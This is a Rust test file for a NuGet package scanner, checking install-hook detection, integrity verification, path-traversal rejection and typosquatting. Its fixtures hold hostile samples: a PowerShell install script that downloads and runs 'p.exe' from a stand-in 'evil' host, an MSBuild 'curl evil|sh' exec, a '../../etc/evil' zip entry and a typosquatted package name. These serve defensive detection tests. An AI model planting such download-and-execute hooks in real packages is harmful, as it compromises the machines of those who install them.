//! End-to-end tests for `fetch_and_scan_nuget` via MockTransport.

use argus_core::Decision;
use argus_nuget::{fetch_and_scan_nuget, NugetFetchOptions, NugetRef};
use argus_test_support::MockTransport;
use base64::engine::general_purpose::STANDARD;
use base64::Engine as _;
use sha2::{Digest, Sha512};
use std::io::Write;

const REGISTRY: &str = "https://api.nuget.org";

/// Build a `.nupkg` (ZIP) with the supplied (path, body) entries.
fn make_nupkg(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut buf = Vec::new();
    {
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
        let opts: zip::write::FileOptions<()> =
            zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        for (path, body) in files {
            writer.start_file(*path, opts).unwrap();
            writer.write_all(body).unwrap();
        }
        writer.finish().unwrap();
    }
    buf
}

fn nuspec(id: &str, version: &str) -> Vec<u8> {
    format!(
        r#"<?xml version="1.0"?>
<package xmlns="http://schemas.microsoft.com/packaging/2010/07/nuspec.xsd">
  <metadata>
    <id>{id}</id>
    <version>{version}</version>
    <authors>tester</authors>
  </metadata>
</package>"#
    )
    .into_bytes()
}

fn sha512_b64(b: &[u8]) -> String {
    STANDARD.encode(Sha512::digest(b))
}

/// Register the standard flat-container index + download routes. `id` is
/// the lowercased id used in URLs.
fn base_routes(transport: &MockTransport, id: &str, version: &str, nupkg: &[u8]) {
    let index = format!(r#"{{"versions": ["{version}"]}}"#);
    transport.insert(
        &format!("{REGISTRY}/v3-flatcontainer/{id}/index.json"),
        index.into_bytes(),
    );
    transport.insert(
        &format!("{REGISTRY}/v3-flatcontainer/{id}/{version}/{id}.{version}.nupkg"),
        nupkg.to_vec(),
    );
}

/// Register the registration leaf + catalog entry that carry packageHash.
fn integrity_routes(
    transport: &MockTransport,
    id: &str,
    version: &str,
    hash_b64: &str,
    algo: &str,
) {
    let catalog_url = format!("{REGISTRY}/v3/catalog0/data/{id}.{version}.json");
    let reg = format!(r#"{{"catalogEntry": {{"@id": "{catalog_url}"}}}}"#);
    transport.insert(
        &format!("{REGISTRY}/v3/registration5-gz-semver2/{id}/{version}.json"),
        reg.into_bytes(),
    );
    let catalog = format!(r#"{{"packageHash": "{hash_b64}", "packageHashAlgorithm": "{algo}"}}"#);
    transport.insert(&catalog_url, catalog.into_bytes());
}

fn rule_ids(report: &argus_core::ScanReport) -> Vec<String> {
    report.findings.iter().map(|f| f.rule_id.clone()).collect()
}

#[test]
fn malicious_install_hook_blocks() {
    let nupkg = make_nupkg(&[
        ("Evil.Pkg.nuspec", &nuspec("Evil.Pkg", "1.0.0")),
        (
            "tools/install.ps1",
            b"Invoke-WebRequest http://evil/x -OutFile p.exe; Start-Process p.exe",
        ),
    ]);
    let transport = MockTransport::new();
    base_routes(&transport, "evil.pkg", "1.0.0", &nupkg);
    integrity_routes(
        &transport,
        "evil.pkg",
        "1.0.0",
        &sha512_b64(&nupkg),
        "SHA512",
    );

    let opts = NugetFetchOptions {
        registry: REGISTRY.to_string(),
        ..NugetFetchOptions::default()
    };
    let pkg = NugetRef::parse("Evil.Pkg").unwrap();
    let report = fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap();

    let ids = rule_ids(&report);
    assert!(
        ids.contains(&"nuget-install-script".to_string()),
        "got: {ids:?}"
    );
    assert!(
        ids.contains(&"powershell-download-exec".to_string()),
        "got: {ids:?}"
    );
    assert_eq!(report.decision, Decision::Block);
}

#[test]
fn msbuild_build_time_exec_blocks() {
    let nupkg = make_nupkg(&[
        ("Builder.Pkg.nuspec", &nuspec("Builder.Pkg", "2.0.0")),
        (
            "build/Builder.Pkg.targets",
            br#"<Project><Target><Exec Command="curl evil|sh"/></Target></Project>"#,
        ),
    ]);
    let transport = MockTransport::new();
    base_routes(&transport, "builder.pkg", "2.0.0", &nupkg);
    integrity_routes(
        &transport,
        "builder.pkg",
        "2.0.0",
        &sha512_b64(&nupkg),
        "SHA512",
    );

    let opts = NugetFetchOptions {
        registry: REGISTRY.to_string(),
        ..NugetFetchOptions::default()
    };
    let pkg = NugetRef::parse("Builder.Pkg").unwrap();
    let report = fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap();

    let ids = rule_ids(&report);
    assert!(
        ids.contains(&"msbuild-exec-task".to_string()),
        "got: {ids:?}"
    );
    assert_eq!(report.decision, Decision::Block);
}

#[test]
fn clean_package_allows_and_parses_manifest() {
    // lib DLL is binary (NUL byte) so it is skipped by looks_binary.
    let nupkg = make_nupkg(&[
        ("Clean.Pkg.nuspec", &nuspec("Clean.Pkg", "3.4.5")),
        ("lib/net8.0/Clean.Pkg.dll", &[0u8, 1, 2, 3, 0, 9]),
        ("readme.txt", b"A perfectly benign package.\n"),
    ]);
    let transport = MockTransport::new();
    base_routes(&transport, "clean.pkg", "3.4.5", &nupkg);
    integrity_routes(
        &transport,
        "clean.pkg",
        "3.4.5",
        &sha512_b64(&nupkg),
        "SHA512",
    );

    let opts = NugetFetchOptions {
        registry: REGISTRY.to_string(),
        ..NugetFetchOptions::default()
    };
    let pkg = NugetRef::parse("Clean.Pkg").unwrap();
    let report = fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap();

    assert!(report.findings.is_empty(), "got: {:?}", rule_ids(&report));
    assert_eq!(report.decision, Decision::Allow);
    assert_eq!(report.package_name.as_deref(), Some("Clean.Pkg"));
    assert_eq!(report.package_version.as_deref(), Some("3.4.5"));
}

#[test]
fn integrity_verified_path_no_unverifiable_finding() {
    let nupkg = make_nupkg(&[("Ok.Pkg.nuspec", &nuspec("Ok.Pkg", "1.0.0"))]);
    let transport = MockTransport::new();
    base_routes(&transport, "ok.pkg", "1.0.0", &nupkg);
    integrity_routes(&transport, "ok.pkg", "1.0.0", &sha512_b64(&nupkg), "SHA512");

    let opts = NugetFetchOptions {
        registry: REGISTRY.to_string(),
        ..NugetFetchOptions::default()
    };
    let pkg = NugetRef::parse("Ok.Pkg").unwrap();
    let report = fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap();

    let ids = rule_ids(&report);
    assert!(
        !ids.contains(&"nuget-integrity-unverifiable".to_string()),
        "got: {ids:?}"
    );
    assert_eq!(report.decision, Decision::Allow);
}

#[test]
fn integrity_mismatch_errors() {
    let nupkg = make_nupkg(&[("Bad.Pkg.nuspec", &nuspec("Bad.Pkg", "1.0.0"))]);
    let transport = MockTransport::new();
    base_routes(&transport, "bad.pkg", "1.0.0", &nupkg);
    // Wrong hash: SHA-512 of different bytes.
    let wrong = sha512_b64(b"totally different content");
    integrity_routes(&transport, "bad.pkg", "1.0.0", &wrong, "SHA512");

    let opts = NugetFetchOptions {
        registry: REGISTRY.to_string(),
        ..NugetFetchOptions::default()
    };
    let pkg = NugetRef::parse("Bad.Pkg").unwrap();
    let err = format!(
        "{:#}",
        fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap_err()
    );
    assert!(err.contains("SHA-512 mismatch"), "got: {err}");
}

#[test]
fn integrity_unverifiable_when_catalog_absent() {
    // No registration/catalog routes registered → catalog hop fails.
    let nupkg = make_nupkg(&[("Unv.Pkg.nuspec", &nuspec("Unv.Pkg", "1.0.0"))]);
    let transport = MockTransport::new();
    base_routes(&transport, "unv.pkg", "1.0.0", &nupkg);

    let opts = NugetFetchOptions {
        registry: REGISTRY.to_string(),
        ..NugetFetchOptions::default()
    };
    let pkg = NugetRef::parse("Unv.Pkg").unwrap();
    let report = fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap();

    let ids = rule_ids(&report);
    assert!(
        ids.contains(&"nuget-integrity-unverifiable".to_string()),
        "got: {ids:?}"
    );
    // Info-only finding must not force a Block on its own.
    assert_eq!(report.decision, Decision::Allow);
    // The detail must surface the reason (U-29 visibility).
    let detail = report
        .findings
        .iter()
        .find(|f| f.rule_id == "nuget-integrity-unverifiable")
        .map(|f| f.detail.clone())
        .unwrap();
    assert!(detail.contains("digest not verified"), "got: {detail}");
}

#[test]
fn catalog_url_on_foreign_host_is_unverifiable_not_fetched() {
    // The registration leaf points catalogEntry.@id at a foreign host.
    // The host pin must reject that URL before fetching it, and the failure
    // surfaces as an Info `nuget-integrity-unverifiable` finding (U-29),
    // never a silent fetch of attacker-controlled content.
    let nupkg = make_nupkg(&[("Foreign.Pkg.nuspec", &nuspec("Foreign.Pkg", "1.0.0"))]);
    let transport = MockTransport::new();
    base_routes(&transport, "foreign.pkg", "1.0.0", &nupkg);
    let evil_catalog = "https://evil.example.invalid/catalog.json";
    transport.insert(
        &format!("{REGISTRY}/v3/registration5-gz-semver2/foreign.pkg/1.0.0.json"),
        format!(r#"{{"catalogEntry": {{"@id": "{evil_catalog}"}}}}"#).into_bytes(),
    );
    // Register the evil catalog body — but the host pin must prevent fetching it.
    transport.insert(
        evil_catalog,
        br#"{"packageHash": "AAAA", "packageHashAlgorithm": "SHA512"}"#.to_vec(),
    );

    let opts = NugetFetchOptions {
        registry: REGISTRY.to_string(),
        ..NugetFetchOptions::default()
    };
    let pkg = NugetRef::parse("Foreign.Pkg").unwrap();
    let report = fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap();
    let ids = rule_ids(&report);
    assert!(
        ids.contains(&"nuget-integrity-unverifiable".to_string()),
        "got: {ids:?}"
    );
    assert_eq!(report.decision, Decision::Allow);
}

#[test]
fn rejects_http_download_url() {
    let registry = "http://api.nuget.org";
    let nupkg = make_nupkg(&[("X.nuspec", &nuspec("X", "1.0.0"))]);
    let transport = MockTransport::new();
    transport.insert(
        &format!("{registry}/v3-flatcontainer/x/index.json"),
        br#"{"versions": ["1.0.0"]}"#.to_vec(),
    );
    transport.insert(
        &format!("{registry}/v3-flatcontainer/x/1.0.0/x.1.0.0.nupkg"),
        nupkg,
    );

    let opts = NugetFetchOptions {
        registry: registry.to_string(),
        ..NugetFetchOptions::default()
    };
    let pkg = NugetRef::parse("X").unwrap();
    let err = format!(
        "{:#}",
        fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap_err()
    );
    assert!(err.contains("non-HTTPS"), "got: {err}");
}

#[test]
fn path_escape_zip_entry_bails() {
    // A ZIP entry with an absolute/parent path must be refused.
    let mut buf = Vec::new();
    {
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
        let opts: zip::write::FileOptions<()> = zip::write::FileOptions::default();
        // `..` traversal in the entry name.
        writer.start_file("../../etc/evil", opts).unwrap();
        writer.write_all(b"pwned").unwrap();
        writer.finish().unwrap();
    }
    let transport = MockTransport::new();
    base_routes(&transport, "esc.pkg", "1.0.0", &buf);
    integrity_routes(&transport, "esc.pkg", "1.0.0", &sha512_b64(&buf), "SHA512");

    let opts = NugetFetchOptions {
        registry: REGISTRY.to_string(),
        ..NugetFetchOptions::default()
    };
    let pkg = NugetRef::parse("Esc.Pkg").unwrap();
    let err = format!(
        "{:#}",
        fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap_err()
    );
    assert!(
        err.contains("traverses parent dir") || err.contains("unsafe path"),
        "got: {err}"
    );
}

#[test]
fn version_resolution_picks_highest_non_prerelease() {
    let nupkg = make_nupkg(&[("Multi.Pkg.nuspec", &nuspec("Multi.Pkg", "1.5.0"))]);
    let transport = MockTransport::new();
    // Index advertises multiple versions; expect 1.5.0 (highest stable).
    transport.insert(
        &format!("{REGISTRY}/v3-flatcontainer/multi.pkg/index.json"),
        br#"{"versions": ["1.0.0", "2.0.0-beta", "1.5.0"]}"#.to_vec(),
    );
    transport.insert(
        &format!("{REGISTRY}/v3-flatcontainer/multi.pkg/1.5.0/multi.pkg.1.5.0.nupkg"),
        nupkg.clone(),
    );
    integrity_routes(
        &transport,
        "multi.pkg",
        "1.5.0",
        &sha512_b64(&nupkg),
        "SHA512",
    );

    let opts = NugetFetchOptions {
        registry: REGISTRY.to_string(),
        ..NugetFetchOptions::default()
    };
    let pkg = NugetRef::parse("Multi.Pkg").unwrap();
    let report = fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap();
    assert_eq!(report.package_version.as_deref(), Some("1.5.0"));
}

#[test]
fn version_resolution_exact_prerelease() {
    let nupkg = make_nupkg(&[("Multi.Pkg.nuspec", &nuspec("Multi.Pkg", "2.0.0-beta"))]);
    let transport = MockTransport::new();
    transport.insert(
        &format!("{REGISTRY}/v3-flatcontainer/multi.pkg/index.json"),
        br#"{"versions": ["1.0.0", "2.0.0-beta", "1.5.0"]}"#.to_vec(),
    );
    transport.insert(
        &format!("{REGISTRY}/v3-flatcontainer/multi.pkg/2.0.0-beta/multi.pkg.2.0.0-beta.nupkg"),
        nupkg.clone(),
    );
    integrity_routes(
        &transport,
        "multi.pkg",
        "2.0.0-beta",
        &sha512_b64(&nupkg),
        "SHA512",
    );

    let opts = NugetFetchOptions {
        registry: REGISTRY.to_string(),
        ..NugetFetchOptions::default()
    };
    let pkg = NugetRef::parse("Multi.Pkg@2.0.0-beta").unwrap();
    let report = fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap();
    assert_eq!(report.package_version.as_deref(), Some("2.0.0-beta"));
}

#[test]
fn typosquatting_blocks() {
    // `Newtonsift.Json` is one substitution (o→i) from `Newtonsoft.Json`.
    let nupkg = make_nupkg(&[(
        "Newtonsift.Json.nuspec",
        &nuspec("Newtonsift.Json", "1.0.0"),
    )]);
    let transport = MockTransport::new();
    base_routes(&transport, "newtonsift.json", "1.0.0", &nupkg);
    integrity_routes(
        &transport,
        "newtonsift.json",
        "1.0.0",
        &sha512_b64(&nupkg),
        "SHA512",
    );

    let opts = NugetFetchOptions {
        registry: REGISTRY.to_string(),
        ..NugetFetchOptions::default()
    };
    let pkg = NugetRef::parse("Newtonsift.Json").unwrap();
    let report = fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap();

    let ids = rule_ids(&report);
    assert!(ids.contains(&"typosquatting".to_string()), "got: {ids:?}");
    assert!(ids.contains(&"low-reputation".to_string()), "got: {ids:?}");
    assert_eq!(report.decision, Decision::Block);
}

#[test]
fn exact_popular_name_no_typosquat() {
    let nupkg = make_nupkg(&[(
        "Newtonsoft.Json.nuspec",
        &nuspec("Newtonsoft.Json", "13.0.3"),
    )]);
    let transport = MockTransport::new();
    base_routes(&transport, "newtonsoft.json", "13.0.3", &nupkg);
    integrity_routes(
        &transport,
        "newtonsoft.json",
        "13.0.3",
        &sha512_b64(&nupkg),
        "SHA512",
    );

    let opts = NugetFetchOptions {
        registry: REGISTRY.to_string(),
        ..NugetFetchOptions::default()
    };
    let pkg = NugetRef::parse("Newtonsoft.Json").unwrap();
    let report = fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap();

    let ids = rule_ids(&report);
    assert!(!ids.contains(&"typosquatting".to_string()), "got: {ids:?}");
    assert_eq!(report.decision, Decision::Allow);
}
